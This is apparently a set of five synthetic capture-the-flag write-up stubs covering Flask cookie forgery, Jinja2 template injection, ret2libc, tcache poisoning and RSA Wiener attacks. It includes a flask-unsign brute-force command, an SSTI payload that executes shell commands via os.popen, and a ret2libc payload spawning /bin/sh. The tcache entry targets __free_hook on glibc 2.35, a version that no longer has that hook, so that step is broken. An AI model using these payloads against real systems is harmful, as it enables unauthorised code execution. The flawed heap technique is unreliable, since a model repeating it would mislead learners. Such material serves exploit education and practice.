title: Synthetic Flask Session Forgery
content:
# Flask Session Forgery

## Analysis
The application signs Flask session cookies with a weak secret key.

## Exploitation
Use flask-unsign to brute force the key and forge an admin cookie.

```bash
flask-unsign --unsign --cookie "$COOKIE" --wordlist ./secrets.txt
```

title: Synthetic Jinja2 SSTI
content:
# Jinja2 SSTI

## Vulnerability
The server renders attacker-controlled input in a Jinja2 template.

## Exploitation
The payload {{ cycler.__init__.__globals__.os.popen('id').read() }} gives command execution.

title: Synthetic ret2libc Walkthrough
content:
# Ret2libc

## Reconnaissance
The binary is 32-bit with NX enabled.

## Exploitation
Leak puts, compute libc base, then jump to system('/bin/sh'). This is a classic ret2libc chain.

```python
payload = flat(system, exit, next(libc.search(b'/bin/sh')))
```

title: Synthetic Safe-Linking Tcache Poisoning
content:
# Tcache Poisoning with Safe-Linking

## Analysis
glibc 2.35 uses safe-linking. The writeup reconstructs the masked forward pointer.

## Error
malloc(): unaligned tcache chunk detected

## Exploitation
Recover the heap key, forge the next pointer, and overwrite __free_hook.

title: Synthetic RSA Wiener Attack
content:
# RSA Small Private Exponent

## Analysis
The private exponent is too small, so Wiener attack recovers d from continued fractions.
